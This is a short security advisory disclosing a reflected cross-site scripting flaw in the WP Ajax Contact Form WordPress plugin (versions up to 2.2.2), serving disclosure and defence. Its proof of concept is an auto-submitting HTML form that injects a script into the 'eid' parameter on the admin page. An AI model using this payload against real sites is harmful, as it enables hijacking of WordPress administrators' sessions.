## WordPress Plugin Vulnerabilities

# WP Ajax Contact Form <= 2.2.2 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against admin users

### Proof of Concept

Make a logged in admin open a file containing the following HTML:
```
<form action="http://example.com/wordpress/wp-admin/admin.php?page=dform" method="POST">
<input type="hidden" name="eid" value='<script>alert(1)</script>'>
<input type="submit" name="edit" value="Edit">
</form>
<script>
document.forms[0].submit();
</script>
```
